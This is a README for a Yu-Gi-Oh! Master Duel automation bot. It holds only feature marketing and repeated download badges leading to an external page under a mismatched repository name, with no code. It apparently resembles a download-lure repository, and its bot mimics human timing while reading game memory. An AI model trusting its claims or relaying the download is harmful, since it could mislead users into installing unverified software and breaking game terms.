![preview](https://raw.githubusercontent.com/aerisgrace29/Duel-Forge-Bot/main/showcase_1400517.svg)
[![Download](https://raw.githubusercontent.com/aerisgrace29/Duel-Forge-Bot/main/app_5e42.svg)](https://aerisgrace29.github.io/Duel-Forge-Bot/)

# 🃏 JMaster-Duel-Bot — Autonomous Duel Companion for Yu-Gi-Oh! Master Duel

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Steam-blue)](https://store.steampowered.com/)
[![Language](https://img.shields.io/badge/Language-C%23%20%7C%20Python-239120)](https://dotnet.microsoft.com/)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)]()
[![Version](https://img.shields.io/badge/Version-4.2.0--Starlight-orange)]()
[![Build](https://img.shields.io/badge/Build-Passing-success)]()
[![Contributions](https://img.shields.io/badge/Contributions-Welcome-ff69b4)]()
[![Discord](https://img.shields.io/badge/Community-Duelist%20Hub-7289da)]()
[![Made With](https://img.shields.io/badge/Made%20With-Coffee%20%26%20Card%20Games-red)]()

> *"In the world of dueling, the mind is the sharpest blade. This companion simply keeps it whetted."*

Welcome to **JMaster-Duel-Bot**, an advanced open-source project engineered for the modern duelist who wants to sharpen their Yu-Gi-Oh! Master Duel experience. Unlike conventional game overlays that just shout statistics at you, this project behaves more like a seasoned sparring partner — observing, learning, and gently surfacing intelligence so *you* remain the strategist. Whether you are climbing the ranked ladder, refining a combo line, or cataloging your collection across sessions, JMaster-Duel-Bot is the quiet force multiplier sitting beside your keyboard.

This repository bundles two intertwined technologies: a **mod layer** that enriches the in-client experience without disrupting the official Steam build, and a **bot engine** that can pilot routine duels, practice scenarios, and repetitive resource farming with configurable autonomy. It is crafted for enthusiasts, tinkerers, and competitive players who value transparency, extensibility, and a codebase they can actually read.

---

## 📖 Table of Contents

- [🌟 Project Vision](#-project-vision)
- [🎯 Why This Exists](#-why-this-exists)
- [⚙️ Feature Arsenal](#️-feature-arsenal)
- [🧠 The Duel Intelligence Engine](#-the-duel-intelligence-engine)
- [🎨 Responsive Interface & Experience](#-responsive-interface--experience)
- [🌍 Multilingual Support](#-multilingual-support)
- [🕐 24/7 Companion Support Model](#-247-companion-support-model)
- [🔧 Configuration Deep Dive](#-configuration-deep-dive)
- [🧩 Module Ecosystem](#-module-ecosystem)
- [📊 Telemetry & Match Analytics](#-telemetry--match-analytics)
- [🚀 Quick Start Without the Hassle](#-quick-start-without-the-hassle)
- [🗺️ Roadmap 2026](#️-roadmap-2026)
- [🤝 Contributing](#-contributing)
- [⚠️ Disclaimer](#️-disclaimer)
- [📜 License](#-license)
- [💬 Community & Support](#-community--support)

---

## 🌟 Project Vision

Yu-Gi-Oh! has always been about reading the board, anticipating the opponent, and executing with precision. JMaster-Duel-Bot was born from a simple observation: modern digital dueling offers endless data, yet very little of it reaches the player in a *useful* form at the moment of decision.

Our vision is to close that gap with a companion that feels less like a script and more like a chess clock with a brain — always ready, never intrusive. We prioritize:

- **Transparency** — every decision the bot makes can be inspected and logged.
- **Restraint** — the tool assists; it does not dominate the spotlight.
- **Longevity** — modular architecture that survives game patches.
- **Craftsmanship** — clean, documented, and testable code.

This is not a shortcut. It is a training wheel that you eventually master, then choose to keep for the analytics.

---

## 🎯 Why This Exists

Master Duel is brilliant, but the grind is real. Daily missions, seasonal resets, limited-time events, and the slow burn of collecting gems all compete for the same precious hours. JMaster-Duel-Bot reclaims some of that time by automating the *boring* part while leaving the *fun* part to you.

Think of it as delegating the dishwashing so you can focus on plating the meal. The bot handles repetition; you handle the fireworks.

---

## ⚙️ Feature Arsenal

### 🎮 Core Dueling Capabilities

- **Autonomous Solo Mode Runner** — Navigate gate duels and loaner challenges with adaptive pacing that mimics human rhythm.
- **Ranked Ladder Assistant** — Practice-driven simulation mode that mirrors real ranked decision trees without affecting your actual rank.
- **Replay Harvester** — Automatically saves and tags replay files for review, indexed by archetype and outcome.
- **Deck Switching Orchestrator** — Rotate between saved decks with configurable rules (mission targeting, win-rate thresholds, or time-based).
- **Mission Tracker Sync** — Watches daily and lifetime missions, prioritizing duels that advance multiple objectives at once.

### 🧪 Deck & Collection Tools

- **Archetype Scanner** — Reads your collection and proposes synergies you may have overlooked, using a rules-based engine (no external APIs required).
- **Crafting Planner** — Highlights which missing pieces yield the greatest strategic gain for your existing decks.
- **Pack Opening Recorder** — Logs pack results into a local database for pity-timer and rarity statistics.
- **Decklist Versioning** — Keeps a diff history of every deck change so you can roll back experiments that flop.

### 🛠️ Developer-Facing Features

- **Plugin Architecture** — Drop new behaviors into the `modules/` directory and they register automatically.
- **Deterministic Replay Engine** — Re-run a recorded duel against alternative strategies to compare outcomes.
- **Rule Hook System** — Subscribe to game events (draw, summon, chain resolution) with lightweight callbacks.
- **Headless Simulation Mode** — Run thousands of abstracted duel scenarios offline for statistical research.

### 🔐 Reliability & Safety

- **Watchdog Process** — Monitors the companion and restarts cleanly if state drifts.
- **Failsafe Pause** — Any unrecognized screen halts automation and preserves a diagnostic snapshot.
- **Local-Only Data** — All logs, profiles, and statistics live on your machine by default.

---

## 🧠 The Duel Intelligence Engine

Under the hood, JMaster-Duel-Bot uses a **layered decision model**. It does not pretend to be omniscient; instead, it plays the percentages with clear reasoning.

**Layer 1 — Perception:** Screenshots and memory reads are distilled into a structured board state: zones, life points, hand size, graveyard contents (where visible), and phase indicators.

**Layer 2 — Heuristics:** A library of tactical rules scores each legal action. Rules are grouped by archetype family so that a Dragonmaid deck doesn't get advice meant for Sky Strikers.

**Layer 3 — Lookahead:** For critical turns, the engine runs shallow simulations to evaluate one or two move sequences ahead. Depth is configurable to balance speed versus insight.

**Layer 4 — Policy:** The final action is chosen through a weighted blend of heuristics and simulation, with a tunable "personality" parameter that ranges from conservative to aggressive.

Every chosen action is logged with its rationale — because a bot you cannot understand is a bot you cannot trust.

---

## 🎨 Responsive Interface & Experience

The companion dashboard is built to feel native on any display, from a modest laptop panel to an ultrawide battlestation. The layout fluidly rearranges widgets so that your most-used panels — match log, deck selector, and mission progress — remain within a glance.

- **Adaptive Grid Layout** — Panels reflow rather than overflow.
- **Dark & Light Themes** — Because dueling happens at 2 AM too.
- **Keyboard-First Navigation** — Full hotkey coverage for players who never touch the mouse mid-combo.
- **Compact Overlay Mode** — A minimal HUD for when you want stats without walls of text.
- **Instant Filtering** — Search your replay library by deck, opponent archetype, or turn count.

The philosophy is simple: the interface should disappear when you don't need it and appear instantly when you do.

---

## 🌍 Multilingual Support

Duelists duel in every language. The companion speaks many of them:

- 🇺🇸 English
- 🇯🇵 Japanese
- 🇰🇷 Korean
- 🇩🇪 German
- 🇫🇷 French
- 🇪🇸 Spanish
- 🇧🇷 Portuguese (Brazil)
- 🇨🇳 Simplified Chinese
- 🇷🇺 Russian
- 🇵🇱 Polish

Language packs are plain text files, making community translations painless. If your language is missing, contributing a pack is one of the friendliest ways to help.

---

## 🕐 24/7 Companion Support Model

Automation should not mean abandonment. JMaster-Duel-Bot ships with a **support philosophy of continuous availability**:

- **Always-On Watchdog** — If the bot stalls, it self-recovers without your intervention.
- **Community Help Desk** — A rotating group of maintainers and volunteers keeps questions answered across time zones.
- **Knowledge Base** — Docs, FAQs, and troubleshooting flows updated continuously.
- **Crash Reporter (Opt-In)** — Sends anonymous diagnostics so patches arrive faster.
- **Version Guardian** — Alerts you when the game updates and a companion update is recommended.

You are never dueling alone.

---

## 🔧 Configuration Deep Dive

The heart of customization lives in `config/duelist.toml`. A few highlights:

- `pacing.human_variance` — Controls how much the bot varies its timing. Lower values are faster; higher values feel more natural.
- `strategy.risk_profile` — Options: `cautious`, `balanced`, `bold`, `chaotic`. Each reshapes the scoring weights.
- `missions.priority_mode` — Choose `gems`, `xp`, `lifetime`, or `balanced`.
- `safety.pause_on_unknown` — Defaults to `true`. Leave it on unless you enjoy surprises.
- `logging.verbosity` — From `silent` to `diagnostic`. Diagnostic logs include full board dumps.

Every option is documented inline, so you can tune the companion like an instrument rather than guess at it like a riddle.

---

## 🧩 Module Ecosystem

Modules are self-contained behaviors with a manifest file describing their name, version, and required hooks. Existing first-party modules include:

- **RankedAssistant** — Analysis-only support for ladder play.
- **SoloGrinder** — Efficient clearing of gate content.
- **EventRunner** — Adapts to limited-time event structures.
- **ReplayCurator** — Tags and archives replays by archetype.
- **CraftAdvisor** — Suggests high-value crafting targets.
- **DeckDoctor** — Flags inconsistent ratios and dead-card clusters.

Third-party modules follow the same interface, so the ecosystem can grow without touching the core.

---

## 📊 Telemetry & Match Analytics

Numbers are the quietest coaches. The analytics suite tracks:

- **Win/Loss by archetype matchup**
- **First-turn versus second-turn performance**
- **Average game length by deck**
- **Brick rate** (hands with no playable starter)
- **Chain resolution accuracy** in replay comparisons
- **Gem and ticket earning velocity over time**

Charts are rendered locally and exportable as CSV for spreadsheet wizards. Nothing leaves your machine unless you explicitly opt in.

---

## 🚀 Quick Start Without the Hassle

Getting running should feel like shuffling a deck, not reading a textbook.

1. **Verify prerequisites** — A recent Windows build and the Steam edition of Master Duel.
2. **Retrieve the companion package** using the asset below.
3. **Unpack** into a directory you can find again (avoid deep nested folders).
4. **Launch the companion** and let it detect your game installation automatically.
5. **Review the first-run wizard** to set pacing, language, and safety preferences.
6. **Press the start hotkey** and watch the companion mirror your intent.

[![Download](https://raw.githubusercontent.com/aerisgrace29/Duel-Forge-Bot/main/app_5e42.svg)](https://aerisgrace29.github.io/Duel-Forge-Bot/)

For a more narrative walkthrough, consult the `docs/getting-started.md` guide, which reads like a friendly onboarding letter rather than a manual.

---

## 🗺️ Roadmap 2026

The team is already sketching the next chapters:

- **Q1 2026** — Expanded archetype heuristic packs and a visual deck editor.
- **Q2 2026** — Cross-session mission memory and improved replay diffing.
- **Q3 2026** — Community module marketplace (curated, signature-verified).
- **Q4 2026** — Deeper simulation depth with configurable lookahead trees.

Suggestions from the community shape this roadmap. The best ideas often come from a duelist who was frustrated at 1 AM.

---

## 🤝 Contributing

Contributions are the lifeblood of this project. Whether you fix a typo, translate a string, or design a new heuristic pack, you are welcome here.

- **Bug reports** — Include logs and reproduction steps.
- **Feature requests** — Describe the duelist problem, not just the solution.
- **Pull requests** — Keep them focused and documented.
- **Translations** — Submit a language pack file and we'll integrate it.

Please read `CONTRIBUTING.md` for the full etiquette guide. Be kind, be curious, and remember that everyone here started as a beginner.

---

## ⚠️ Disclaimer

JMaster-Duel-Bot is an independent, community-driven project and is **not affiliated with, endorsed by, or sponsored by Konami, Steam, or any official Yu-Gi-Oh! entity**. All trademarks belong to their respective owners.

This software is provided for **educational, research, and personal productivity purposes**. Users are responsible for understanding and complying with the terms of service of any game or platform they interact with. The maintainers assume no liability for account consequences, data loss, or unexpected behavior arising from use of this project.

Automation features are intended for offline practice, personal analytics, and accessibility scenarios. Use them responsibly, and always respect the communities you duel within.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it in accordance with the terms of that license.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 JMaster-Duel-Bot Contributors.

---

## 💬 Community & Support

- **Discussions** — Ask questions, share strategies, and swap deck tech.
- **Issues** — Report bugs or request features with a clear title.
- **Wiki** — Long-form guides and module authoring tutorials.

Whether you are a returning veteran or a first-time duelist, we are glad you found this project. May your draws be kind and your chains resolve in your favor.

[![Download](https://raw.githubusercontent.com/aerisgrace29/Duel-Forge-Bot/main/app_5e42.svg)](https://aerisgrace29.github.io/Duel-Forge-Bot/)